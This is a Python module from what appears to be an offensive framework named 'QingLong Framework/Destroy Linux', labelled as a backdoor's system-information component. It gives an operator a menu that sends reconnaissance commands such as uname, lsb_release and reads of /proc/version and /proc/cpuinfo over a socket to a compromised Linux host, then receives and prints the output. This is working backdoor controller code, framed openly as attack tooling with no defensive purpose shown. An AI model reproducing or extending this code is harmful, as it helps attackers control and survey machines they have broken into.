import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable
from prompt_toolkit.history import InMemoryHistory


def systeminfo(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Information ~ System Info] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == "":
            continue
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 打印所有可用的系统信息:" + '\033[0m')
            command = "uname -a"
            receive(conn, command)
        elif choice == '2':
            print('\033[1;32;32m' + "[+] 内核版本:" + '\033[0m')
            command = "uname -r"
            receive(conn, command)
        elif choice == '3':
            print('\033[1;32;32m' + "[+] 系统主机名:" + '\033[0m')
            command = "uname -n"
            receive(conn, command)
        elif choice == '4':
            print('\033[1;32;32m' + "[+] 查看系统内核架构（64位/32位）:" + '\033[0m')
            command = "uname -m"
            receive(conn, command)
        elif choice == '5':
            print('\033[1;32;32m' + "[+] 发行版信息:" + '\033[0m')
            command = "lsb_release -a"
            receive(conn, command)
        elif choice == '6':
            print('\033[1;32;32m' + "[+] 内核信息:" + '\033[0m')
            command = "cat /proc/version"
            receive(conn, command)
        elif choice == '7':
            print('\033[1;32;32m' + "[+] CPU信息:" + '\033[0m')
            command = "cat /proc/cpuinfo"
            receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "System Info" + '\033[0m' + "\n" + '=' * len("System Info") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "Print all available system information", "打印所有可用的系统信息"], ["2", "Kernel Version", "内核版本"], ["3", "System host name", "系统主机名"],
              ["4", "View system kernel architecture (64 bit/32 bit)", "查看系统内核架构（64位/32位）"], ["5", "Release Information", "发行版信息"],
              ["6", "Kernel Information", "内核信息"], ["7", "CPU information", "CPU信息"],
              ]
    MyTable.createTable(headers, mydata)
